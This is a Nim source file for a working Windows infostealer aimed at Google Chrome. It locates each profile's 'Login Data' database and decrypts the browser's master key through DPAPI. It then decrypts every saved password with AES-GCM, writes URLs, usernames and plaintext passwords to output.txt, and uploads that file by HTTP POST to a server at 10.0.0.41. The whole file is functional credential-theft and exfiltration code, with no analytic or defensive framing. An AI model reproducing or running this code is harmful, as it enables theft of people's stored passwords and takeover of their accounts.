{.compile: "sqlite3.c".}
import base64, json, tiny_sqlite
import nimcrypto/[rijndael, bcmode]
import winim/lean
import std/os, std/httpclient
import std/strutils

proc cryptUnprotectData(data: openarray[byte|char]): string =
  var
    input = DATA_BLOB(cbData: cint data.len, pbData: cast[ptr BYTE](
        unsafeaddr data[0]))
    output: DATA_BLOB
  if CryptUnprotectData(addr input, nil, nil, nil, nil, 0, addr output) != 0:
    result.setLen(output.cbData)
    if output.cbData != 0:
      copyMem(addr result[0], output.pbData, output.cbData)
    LocalFree(cast[HLOCAL](output.pbData))

proc cryptUnprotectData(data: string): string {.inline.} =
  result = cryptUnprotectData(data.toOpenArray(0, data.len - 1))

proc cookieDecrypt(data: openarray[byte]): string =
  var key {.global.}: string
  if data[0 ..< 3] == [byte 118, 49, 48]:
    if key.len == 0:
      let localState = getEnv("LOCALAPPDATA") & r"\Google\Chrome\User Data\Local State"
      let json = parseFile(localState)
      key = json["os_crypt"]["encrypted_key"].getStr().decode().substr(
          5).cryptUnprotectData()
    var
      ctx: GCM[aes256]
      aad: seq[byte]
      iv = data[3 ..< 3 + 12]
      encrypted = data[3 + 12 ..< data.len - 16]
      tag = data[data.len - 16 ..< data.len]
      dtag: array[aes256.sizeBlock, byte]
    if encrypted.len > 0:
      result.setLen(encrypted.len)
      ctx.init(key.toOpenArrayByte(0, key.len - 1), iv, aad)
      ctx.decrypt(encrypted, result.toOpenArrayByte(0, result.len - 1))
      ctx.getTag(dtag)
      assert(dtag == tag)
  else:
    result = cryptUnprotectData(data)

proc getChromePaths(): seq[string] =
  let base = getEnv("LOCALAPPDATA") & r"\Google\Chrome\User Data"
  for kind, path in walkDir(base):
    if kind == pcDir:
      let name = extractFilename(path)
      if name == "Default" or name.startsWith("Profile"):
        let p1 = path & r"\Login Data For Account"
        let p2 = path & r"\Login Data"
        if fileExists(p1):
          result.add(p1)
        elif fileExists(p2):
          result.add(p2)

proc main() =
  let paths = getChromePaths()
  if paths.len == 0:
    echo "[!] No Chrome profile databases found"
    quit(1)

  let f = open("output.txt", fmWrite)

  for dbPath in paths:
    echo "[*] Processing: ", dbPath
    let bak = dbPath & "_bak"

    try:
      copyFile(dbPath, bak)
    except CatchableError as e:
      echo "[!] Copy failed: ", e.msg
      continue

    let db = openDatabase(bak)
    defer: db.close()

    for row in db.rows("SELECT origin_url, username_value, password_value FROM logins"):
      let url = row[0].fromDbValue(string)
      let user = row[1].fromDbValue(string)
      let passBlob = row[2].fromDbValue(seq[byte])

      f.writeLine("Profile: " & dbPath)
      f.writeLine("Origin URL: " & url)
      f.writeLine("Username: " & user)
      if passBlob.len > 0:
        f.writeLine("Password: " & cookieDecrypt(passBlob))
      else:
        f.writeLine("Password: (empty blob)")
      f.writeLine("")

  f.close()
  echo "[*] Saved to output.txt"

  let content = readFile("output.txt")
  let client = newHttpClient()
  defer: client.close()

  try:
    let response = client.request(
      url = "http://10.0.0.41:1235/upload",
      httpMethod = HttpPost,
      body = content,
      headers = newHttpHeaders({
        "Content-Type": "text/plain",
        "X-Filename": "output.txt"
      })
    )
    echo "[*] Upload status: ", response.status
  except CatchableError as e:
    echo "[!] Upload failed: ", e.msg

main()
